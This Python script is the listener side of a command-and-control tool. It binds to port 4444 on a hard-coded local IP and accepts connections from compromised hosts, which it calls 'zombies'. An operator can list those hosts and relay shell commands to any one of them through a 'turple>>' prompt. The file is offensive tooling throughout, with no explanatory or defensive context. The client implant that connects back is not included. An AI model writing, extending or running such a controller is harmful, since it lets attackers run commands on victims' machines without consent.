import socket
import sys
import threading

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 4444
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        host = '192.168.43.205'  # Change this to the desired IP address
        port = 4444
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg))
        sys.exit()

def accept_connection(zombies):
    while True:
        conn, address = s.accept()
        zombies.append({'connection': conn, 'address': address})
        print(f"Connection has been established | IP {address[0]} | Port {address[1]}")
        print("turple>> ", end="")

def list_zombies(zombies):
    print("Connected Zombies:")
    for i, zombie in enumerate(zombies):
        print(f"{i}. IP: {zombie['address'][0]}, Port: {zombie['address'][1]}")

def interact_with_zombie(zombies, target_index):
    target = zombies[target_index]
    conn = target['connection']
    address = target['address']

    print(f"Interacting with Zombie {target_index} | IP: {address[0]} | Port: {address[1]}")
    while True:
        cmd = input(f"zombie-{target_index}>> ")
        if cmd == 'exit':
            break
        try:
            conn.send(str.encode(cmd))
            response = conn.recv(1024).decode('utf-8')
            print(response, end="")
        except socket.error as e:
            print("Error sending/receiving commands:", str(e))
            break

def main():
    socket_create()
    socket_bind()

    global zombies
    zombies = []

    accept_connection_thread = threading.Thread(target=accept_connection, args=(zombies,))
    accept_connection_thread.daemon = True
    accept_connection_thread.start()

    while True:
        cmd = input("turple>> ")
        if cmd == 'quit':
            s.close()
            sys.exit()
        elif cmd == 'zombies':
            list_zombies(zombies)
        elif cmd.startswith('interact'):
            try:
                target_index = int(cmd.split(' ')[1])
                interact_with_zombie(zombies, target_index)
            except (IndexError, ValueError):
                print("Invalid syntax. Use 'interact <zombie_index>'.")
        else:
            print("Invalid command")

if __name__ == "__main__":
    main()
